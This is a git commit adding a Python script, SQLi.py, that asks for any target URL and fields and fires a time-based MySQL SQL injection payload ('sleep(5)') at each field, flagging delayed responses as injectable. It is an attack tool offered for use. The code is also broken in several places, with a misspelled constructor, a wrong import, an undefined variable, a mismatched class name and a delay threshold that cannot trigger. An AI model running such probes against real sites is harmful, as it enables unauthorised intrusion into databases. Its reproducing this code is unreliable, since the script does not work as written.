ca3aea0e03f14c6563eb4fefab91db2504124d36
Lokan1606 <nayuta1606@gmail.com>
2026-03-17 22:25:41 +0700

    make a simple SQLi base, time based attack first

---
+++ SQLi.py
@@ -0,0 +1,63 @@
+import requests
+import time
+from termcolor import color
+
+class SavageSQLInjection(object):
+    def __innit__(self, target=None, fields=None, method=None):
+        self.payload = [
+            {
+                'description' : 'trying MySQL select time based attack',
+                'payload' : "1' * sleep(5) #",
+                'dbms' : 'mysql'
+            }
+        ]
+        if target:
+            self.target = target
+        else:
+            self.target = input("Enter target: ")
+        if fields:
+            self.fields = fields
+        else:
+            self.fields = input("Enter comma seperated fields:  ")
+            self.fields = self.fields.split(',')
+        if method:
+            self.method = method
+        else:
+            self.method = input("Enter method (get/post): ")
+    
+    def inject(self):
+        print(colored("[i] ", "blue") + "Getting Baseline")
+        start = time.time()
+        if self.method == "post":
+            r = requests.post(url=self.target)
+        else:
+            r = requests.get(url=self.target)
+        end = time.time()
+        baseline = end - start
+
+        if r.status_code >= 500:
+            #later
+            None
+        if r.status_code >=200 and r.status_code < 300:
+            for payload in self.payload:
+                for field in self.fields:
+                    print(colored("[i] ", "blue") + "Attacking " + field + " with " + payload['description'])
+                    for secondfield in self.fields:
+                        if secondfield == field:
+                            data[secondfield] = payload['payload']
+                        else:
+                            data[secondfield] = "asd"
+                    start = time.time()
+                    if self.method == "post":
+                        r = requests.post(url=self.target, data=data)
+                    else:
+                        r = requests.get(url=self.target, params=data)
+                    end = time.time()
+                    elapsed = end - start
+                    if elapsed - baseline >= 10:
+                        print(colored("[$] ", "green") + field + " Likely injectable!")
+if __name__ == "__main__":
+    sqlinject = SavageSQLInject()
+    sqlinject.inject()
+        
+
